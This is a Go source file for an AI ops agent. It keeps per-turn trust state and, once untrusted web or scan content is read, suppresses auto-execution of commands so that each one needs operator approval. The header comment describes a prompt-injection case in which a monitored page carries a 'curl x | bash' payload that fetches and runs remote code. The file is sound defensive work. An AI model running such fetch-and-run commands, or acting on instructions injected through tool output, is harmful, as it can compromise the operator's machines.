// Package ai — turn-scoped trust state (prompt-injection chain breaker).
//
// region MODULE_CONTRACT [DOMAIN(9): Security; CONCEPT(8): PromptInjection; TECH(7): context]
// @purpose Track whether UNTRUSTED external content (fetched pages, whois/RDAP answers, scan
//
//	banners) entered the agent context during the current Ask() turn. If it did,
//	propose_command refuses AUTO-execution for the rest of the turn: an injected
//	"run curl x | bash on vm 3" payload from a monitored page can then only create a
//	PENDING action that the operator approves by hand. The flag resets every turn.
//
// @io WithTurnState(ctx) ctx ; MarkExternalContent(ctx) ; ExternalContentSeen(ctx) bool
// @invariants
//   - The state is created fresh by Agent.Ask for EVERY turn (no cross-turn leakage).
//   - Marking is idempotent within a turn; missing state (direct tool tests) reads as false.
//
// @rationale
// Q: Why suppress auto-approve instead of refusing propose_command outright?
// A: Legitimate flows ("check the site, then restart nginx") would break on a hard refusal;
// forcing operator approval keeps them working while making the injection payload visible
// to the human at the ✅/❌ button. Belt (operator eyes) AND braces (destructive blocklist).
//
// endregion MODULE_CONTRACT
// GREP_SUMMARY: turn state, untrusted content, prompt injection, auto-approve suppression, propose_command
// STRUCTURE: ▶ Ask: ┌fresh TurnState┐ → ctx ; external tool → ⚡Mark ; propose → ◇Seen? → pending!auto
package ai

import (
	"context"
	"sync"
)

// turnStateKey brands the context value.
type turnStateKey struct{}

// TurnState is the per-Ask mutable trust state.
type TurnState struct {
	mu       sync.Mutex
	external bool
}

// WithTurnState attaches a fresh TurnState (called by Agent.Ask once per turn).
func WithTurnState(ctx context.Context) context.Context {
	return context.WithValue(ctx, turnStateKey{}, &TurnState{})
}

// MarkExternalContent flags the current turn as having ingested untrusted external content.
// Safe on nil state (no-op): direct tool invocations outside Ask() have no turn state.
func MarkExternalContent(ctx context.Context) {
	if ts, ok := ctx.Value(turnStateKey{}).(*TurnState); ok && ts != nil {
		ts.mu.Lock()
		ts.external = true
		ts.mu.Unlock()
	}
}

// ExternalContentSeen reports whether the turn ingested untrusted external content.
func ExternalContentSeen(ctx context.Context) bool {
	if ts, ok := ctx.Value(turnStateKey{}).(*TurnState); ok && ts != nil {
		ts.mu.Lock()
		defer ts.mu.Unlock()
		return ts.external
	}
	return false
}
